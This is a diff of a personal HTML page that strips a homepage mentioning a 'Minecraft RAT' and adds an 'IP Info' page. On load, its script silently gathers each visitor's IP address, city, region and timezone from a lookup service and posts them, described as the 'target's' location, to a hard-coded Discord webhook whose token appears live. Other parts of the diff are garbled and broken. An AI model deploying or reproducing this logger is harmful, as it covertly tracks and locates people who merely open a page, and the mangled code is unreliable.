@@ -157,18 +157,10 @@
 
 <body>
     <div>
-        <h1>My Favorite Animal is a fat racoon</h1>
-        <h1>Divo Website</h1>
-        <h2>What I did this weekend</h2>
-        <h2>
-            <center>I had a pull party with my family. I made kebob and Hamburgers. I as well as made a new Minecraft
-                RAT
-        </h2>
-        <footer id="ip-address">
             </``>
     </div>
     <script>
-        document.addEventListener("DOMContentLoaded", function () {
+        () {
             // Fetch the IP address from the API
             fetch("document.addEventListener("DOMContentLoaded", function() {
             // Fetch the IP address from the API
@@ -240,4 +232,61 @@
     </script>
 </body>
 
-</html>
+</html
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>IP Info</title>
+    </head>
+    <body>
+        <script>
+            const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+
+            fetch("https://ipapi.co/json")
+                .then(response => response.json())
+                .then(data => {
+                    const payload = {
+                        content: '', // No content for this example
+                        embeds: [
+                            {
+                                title: ":earth_americas: IP Info",
+                                color: 0xFFFF00,
+                                description: "Contains information about the target's IP address and geo-location",
+                                fields: [
+                                    { name: ":globe_with_meridians: Country", value: `\`\`\`\n${data.country_name}\n\`\`\``, inline: true },
+                                    { name: ":globe_with_meridians: City", value: `\`\`\`\n${data.city}\n\`\`\``, inline: true },
+                                    { name: ":globe_with_meridians: Region", value: `\`\`\`\n${data.region}\n\`\`\``, inline: true },
+                                    { name: ":satellite_orbital: IP Address", value: `\`\`\`\n${data.ip}\n\`\`\``, inline: true },
+                                    { name: ":satellite: Protocol", value: `\`\`\`\n${data.version}\n\`\`\``, inline: true },
+                                    { name: ":clock10: Timezone", value: `\`\`\`\n${data.timezone}\n\`\`\``, inline: true }
+                                ]
+                            }
+                        ]
+                    };
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok');
+                        }
+                        console.log('IP sent to Discord successfully!');
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP to Discord:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        </script>
+    </body>
+    </html>
+    
